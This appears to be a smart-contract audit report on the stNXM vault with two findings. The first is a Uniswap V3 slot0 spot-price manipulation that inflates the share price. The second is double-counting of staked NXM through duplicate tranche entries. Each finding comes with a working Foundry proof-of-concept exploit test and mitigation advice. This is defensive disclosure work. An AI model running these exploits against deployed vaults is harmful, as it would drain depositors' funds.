# C-1: Uniswap V3 spot-price manipulation can inflate the share price and drain the vault

**Issue #411 — Submitted on November 20, 2025**

The stNXM vault includes the value of its Uniswap V3 liquidity positions when calculating its assets and circulating share supply.

The position balances are calculated in `dexBalances()` using the current Uniswap V3 spot price returned by `slot0()`:

https://github.com/EaseDeFi/stNXM-Contracts/blob/main/contracts/core/stNXM.sol#L430

```solidity
function dexBalances()
    public
    view
    returns (uint256 assetsAmount, uint256 sharesAmount)
{
    (uint160 sqrtRatio,,,,,,) = dex.slot0();

    for (uint256 i = 0; i < dexTokenIds.length; i++) {
        (uint256 posAmount0, uint256 posAmount1) =
            PositionValue.total(nfp, dexTokenIds[i], sqrtRatio);

        // Position balances are added to assetsAmount and sharesAmount.
    }
}
```

The returned `sharesAmount` is treated as the amount of stNXM held by the liquidity positions and is removed from the reported token supply:

https://github.com/EaseDeFi/stNXM-Contracts/blob/main/contracts/core/stNXM.sol#L409

```solidity
function totalSupply()
    public
    view
    override(ERC20Upgradeable, IERC20)
    returns (uint256)
{
    (, uint256 virtualShares) = dexBalances();

    return super.totalSupply() - virtualShares;
}
```

Because `dexBalances()` uses the current pool price, an attacker can manipulate the value of `virtualShares` during the same transaction.

By selling a large amount of stNXM into the pool, the attacker pushes the pool price down. At the manipulated tick, the vault's liquidity position is calculated as holding more stNXM and less wNXM.

This increases `virtualShares`, reducing the circulating supply returned by `totalSupply()`. Since ERC-4626 conversions depend on the relationship between assets and supply, the reported value of each circulating share increases.

The attacker can then redeem shares acquired before the manipulation and receive more wNXM than they originally deposited.

## Impact

An attacker can inflate the vault's share price and withdraw its liquid wNXM balance.

The attack is limited by the amount of liquidity available in the pool, the capital available for the manipulation, and the amount of liquid wNXM held by the vault.

In the proof of concept, an initial deposit of `100 wNXM` can be redeemed for more than twice its original value after the pool price is manipulated.

## Proof of Concept

The attack follows these steps:

1. The attacker deposits wNXM and receives stNXM shares.
2. The attacker obtains a larger amount of stNXM.
3. The attacker sells the stNXM into the Uniswap V3 pool.
4. The pool's spot price moves significantly.
5. `dexBalances()` reports a larger amount of virtual stNXM shares.
6. `totalSupply()` decreases because the virtual shares are subtracted.
7. The attacker redeems their original shares at the inflated conversion rate.

Create `test/foundry/TotalAssetsManipulation.t.sol` and run:

```bash
forge test --match-contract TotalAssetsManipulationTest -vv
```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "forge-std/interfaces/IERC20.sol";

import "../../contracts/interfaces/INonfungiblePositionManager.sol";
import "../../contracts/interfaces/IUniswapFactory.sol";
import "../../contracts/interfaces/IWNXM.sol";
import "../../contracts/libraries/v3-core/IUniswapV3Pool.sol";
import "../../contracts/libraries/v3-core/ISwapRouter.sol";

import {StNXM} from "../../contracts/core/stNXM.sol";
import {StNxmOracle} from "../../contracts/core/stNxmOracle.sol";

contract TotalAssetsManipulationTest is Test {
    IWNXM internal wNxm =
        IWNXM(0x0d438F3b5175Bebc262bF23753C1E53d03432bDE);

    StNXM internal stNxm;
    StNxmOracle internal stNxmOracle;
    IUniswapV3Pool internal dex;

    ISwapRouter internal swapRouter =
        ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    address internal multisig =
        0x1f28eD9D4792a567DaD779235c2b766Ab84D8E33;

    address internal attacker = address(0xBAD);

    address internal uniswapFactory =
        0x1F98431c8aD98523631AE4a59f267346ea31F984;

    function setUp() public {
        string memory rpcUrl = vm.envString("INFURA_API");

        uint256 fork = vm.createFork(rpcUrl, 19_220_000);
        vm.selectFork(fork);

        stNxm = new StNXM();
        stNxm.initialize(multisig, 100_000 ether);

        IUniswapFactory(uniswapFactory).createPool(
            address(stNxm),
            address(wNxm),
            500
        );

        dex = IUniswapV3Pool(
            IUniswapFactory(uniswapFactory).getPool(
                address(stNxm),
                address(wNxm),
                500
            )
        );

        dex.initialize(79228162514264337593543950336);

        stNxmOracle = new StNxmOracle(
            address(dex),
            address(wNxm),
            address(stNxm)
        );

        deal(address(wNxm), address(stNxm), 2_000 ether);

        stNxm.initializeExternals(
            address(dex),
            address(stNxmOracle),
            1_000 ether
        );

        stNxm.transferOwnership(multisig);

        vm.prank(multisig);
        stNxm.receiveOwnership();

        deal(address(wNxm), attacker, 20_000 ether);
    }

    function test_Exploit_TotalAssetsManipulation() public {
        console2.log(
            "One stNXM before manipulation:",
            stNxm.convertToAssets(1 ether)
        );

        vm.startPrank(attacker);

        wNxm.approve(address(stNxm), type(uint256).max);
        wNxm.approve(address(swapRouter), type(uint256).max);
        stNxm.approve(address(swapRouter), type(uint256).max);

        uint256 initialDeposit = 100 ether;
        uint256 initialShares = stNxm.deposit(
            initialDeposit,
            attacker
        );

        uint256 manipulationCapital = 10_000 ether;
        uint256 sharesToSell = stNxm.deposit(
            manipulationCapital,
            attacker
        );

        ISwapRouter.ExactInputSingleParams memory params =
            ISwapRouter.ExactInputSingleParams({
                tokenIn: address(stNxm),
                tokenOut: address(wNxm),
                fee: 500,
                recipient: attacker,
                deadline: block.timestamp,
                amountIn: sharesToSell,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

        swapRouter.exactInputSingle(params);

        uint256 redeemableAssets =
            stNxm.convertToAssets(initialShares);

        console2.log(
            "One stNXM after manipulation:",
            stNxm.convertToAssets(1 ether)
        );

        console2.log(
            "Redeemable assets:",
            redeemableAssets
        );

        console2.log(
            "Profit:",
            redeemableAssets - initialDeposit
        );

        assertGt(
            redeemableAssets,
            initialDeposit * 2,
            "Share-price manipulation failed"
        );

        vm.stopPrank();
    }
}
```

## Tools Used

Manual review and Foundry

## Recommended Mitigation Steps

The vault should not use the current `slot0()` price when valuing its Uniswap V3 positions.

A time-weighted average price should be used instead. The protocol already includes `StNxmOracle`, which can provide a price that is more resistant to manipulation within a single transaction.

The value used by `dexBalances()` should be derived from this oracle rather than directly from the pool's current tick.

Another option is to use an accounting model that does not allow temporary changes in the LP token composition to immediately affect the vault's circulating supply.

---

# H-1: Duplicate tranche tracking double-counts staked NXM

**Issue #425 — Submitted on November 20, 2025**

The vault tracks the tranches associated with each staking NFT through the `tokenIdToTranches` mapping.

When NXM is deposited through `_stakeNxm()`, the supplied tranche ID is always appended to the array:

https://github.com/EaseDeFi/stNXM-Contracts/blob/main/contracts/core/stNXM.sol#L531

```solidity
function _stakeNxm(
    uint256 _amount,
    address _poolAddress,
    uint256 _trancheId,
    uint256 _requestTokenId
) internal {
    uint256 tokenId = pool.depositTo(
        _amount,
        _trancheId,
        _requestTokenId,
        address(this)
    );

    tokenIdToTranches[tokenId].push(_trancheId);
}
```

The function does not check whether the tranche is already recorded for the same token ID.

This becomes a problem when the owner adds more NXM to an existing tranche. The staking pool updates the existing deposit, but the vault adds the same tranche ID to its tracking array again.

For example, the array can change from:

```text
[250]
```

to:

```text
[250, 250]
```

The `stakedNxm()` function later iterates over this array and retrieves the complete deposit balance for every entry:

https://github.com/EaseDeFi/stNXM-Contracts/blob/main/contracts/core/stNXM.sol#L330

```solidity
function stakedNxm() public view returns (uint256 assets) {
    uint256[] memory trancheIds = tokenIdToTranches[token];

    for (uint256 j = 0; j < trancheIds.length; j++) {
        uint256 tranche = trancheIds[j];

        (,, uint256 stakeShares,) =
            IStakingPool(pool).getDeposit(token, tranche);

        assets +=
            (activeStake * stakeShares) /
            stakeSharesSupply;
    }
}
```

If the same tranche appears twice, `getDeposit()` returns the same total tranche balance both times.

As a result, the full position is counted more than once, even though the vault only owns one deposit.

## Impact

The vault reports more assets than it actually controls.

This increases the ERC-4626 conversion rate and allows users to redeem shares for an amount that is not backed by real assets.

Users redeeming after the duplicate entry is created can drain liquid assets from the vault, while remaining shareholders are left with undercollateralized shares.

The issue occurs during a normal owner operation and does not require the attacker to control any privileged role.

## Proof of Concept

Consider the following sequence:

1. The vault stakes `5,000 NXM` in tranche `250`.
2. `tokenIdToTranches[tokenId]` contains `[250]`.
3. The owner adds another `1,000 NXM` to the same token and tranche.
4. The same tranche ID is appended again.
5. The array now contains `[250, 250]`.
6. The real staking balance is `6,000 NXM`.
7. `stakedNxm()` reads the full `6,000 NXM` balance twice.
8. The function incorrectly reports `12,000 NXM`.

Create `test/foundry/DoubleCountingExploit.t.sol` and run:

```bash
forge test --match-contract DoubleCountingExploitTest -vv
```

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

import {StNXM} from "../../contracts/core/stNXM.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MCK") {}

    function wrap(uint256) external {}

    function unwrap(uint256) external {}
}

contract MockNxmMaster {
    function getLatestAddress(bytes2)
        external
        pure
        returns (address)
    {
        return address(0xCAFE);
    }
}

contract MockDex {
    function slot0()
        external
        pure
        returns (
            uint160,
            int24,
            uint16,
            uint16,
            uint16,
            uint8,
            bool
        )
    {
        return (0, 0, 0, 0, 0, 0, true);
    }
}

contract MockPool {
    mapping(uint256 => mapping(uint256 => uint256))
        public deposits;

    function depositTo(
        uint256 amount,
        uint256 trancheId,
        uint256 requestTokenId,
        address
    ) external returns (uint256) {
        uint256 tokenId =
            requestTokenId == 0 ? 100 : requestTokenId;

        deposits[tokenId][trancheId] += amount;

        return tokenId;
    }

    function getDeposit(
        uint256 tokenId,
        uint256 trancheId
    )
        external
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        uint256 amount = deposits[tokenId][trancheId];

        return (amount, 0, amount, 0);
    }

    function getActiveStake()
        external
        pure
        returns (uint256)
    {
        return 1 ether;
    }

    function getStakeSharesSupply()
        external
        pure
        returns (uint256)
    {
        return 1 ether;
    }

    function getPoolId()
        external
        pure
        returns (uint256)
    {
        return 1;
    }

    function withdraw(
        uint256,
        bool,
        bool,
        uint256[] memory
    )
        external
        pure
        returns (uint256, uint256)
    {
        return (0, 0);
    }
}

contract DoubleCountingExploitTest is Test {
    StNXM internal stNxm;
    MockPool internal pool;

    address internal multisig = address(0x123);

    address internal constant WNXM =
        0x0d438F3b5175Bebc262bF23753C1E53d03432bDE;

    address internal constant NXM =
        0xd7c49CEE7E9188cCa6AD8FF264C1DA2e69D4Cf3B;

    address internal constant NXM_MASTER =
        0x01BFd82675DBCc7762C84019cA518e701C0cD07e;

    address internal constant POOL =
        0x5A44002A5CE1c2501759387895A3b4818C3F50b3;

    function setUp() public {
        deployMockERC20(WNXM);
        deployMockERC20(NXM);

        MockNxmMaster master = new MockNxmMaster();
        vm.etch(NXM_MASTER, address(master).code);

        pool = new MockPool();
        vm.etch(POOL, address(pool).code);

        stNxm = new StNXM();
        stNxm.initialize(multisig, 100_000 ether);

        MockDex mockDex = new MockDex();

        for (uint256 slot = 200; slot < 300; slot++) {
            vm.store(
                address(stNxm),
                bytes32(slot),
                bytes32(uint256(uint160(address(mockDex))))
            );

            (bool success, bytes memory data) =
                address(stNxm).staticcall(
                    abi.encodeWithSignature("dex()")
                );

            if (
                success &&
                data.length >= 32 &&
                abi.decode(data, (address)) ==
                address(mockDex)
            ) {
                break;
            }
        }

        stNxm.transferOwnership(multisig);

        vm.prank(multisig);
        stNxm.receiveOwnership();
    }

    function deployMockERC20(address target) internal {
        MockERC20 implementation = new MockERC20();

        vm.etch(target, address(implementation).code);
        deal(target, address(this), 1_000_000 ether);
    }

    function test_DuplicateTrancheIsCountedTwice() public {
        uint256 trancheId = 250;
        uint256 tokenId = 100;

        vm.prank(multisig);
        stNxm.stakeNxm(
            5_000 ether,
            POOL,
            trancheId,
            0
        );

        uint256 initialStakedAmount =
            stNxm.stakedNxm();

        assertEq(
            initialStakedAmount,
            5_000 ether,
            "Initial stake was calculated incorrectly"
        );

        vm.prank(multisig);
        stNxm.stakeNxm(
            1_000 ether,
            POOL,
            trancheId,
            tokenId
        );

        uint256 reportedStakedAmount =
            stNxm.stakedNxm();

        console2.log(
            "Real staked amount:",
            6_000 ether
        );

        console2.log(
            "Reported staked amount:",
            reportedStakedAmount
        );

        assertEq(
            reportedStakedAmount,
            12_000 ether,
            "The duplicate tranche was not counted twice"
        );
    }
}
```

## Tools Used

Manual review and Foundry

## Recommended Mitigation Steps

The contract should only add a tranche ID when it is not already associated with the staking token.

```solidity
function _stakeNxm(
    uint256 _amount,
    address _poolAddress,
    uint256 _trancheId,
    uint256 _requestTokenId
) internal {
    IStakingPool pool =
        IStakingPool(_poolAddress);

    uint256 tokenId = pool.depositTo(
        _amount,
        _trancheId,
        _requestTokenId,
        address(this)
    );

    uint256[] storage trancheIds =
        tokenIdToTranches[tokenId];

    bool alreadyTracked;

    for (uint256 i = 0; i < trancheIds.length; i++) {
        if (trancheIds[i] == _trancheId) {
            alreadyTracked = true;
            break;
        }
    }

    if (!alreadyTracked) {
        trancheIds.push(_trancheId);
    }
}
```

A more efficient approach would be to maintain a separate mapping:

```solidity
mapping(uint256 tokenId =>
    mapping(uint256 trancheId => bool)
) internal trackedTranches;
```

The array can still be used for iteration, while the mapping provides a constant-time duplicate check.

The mapping should be updated whenever a tranche is added or removed so that both tracking structures remain consistent.
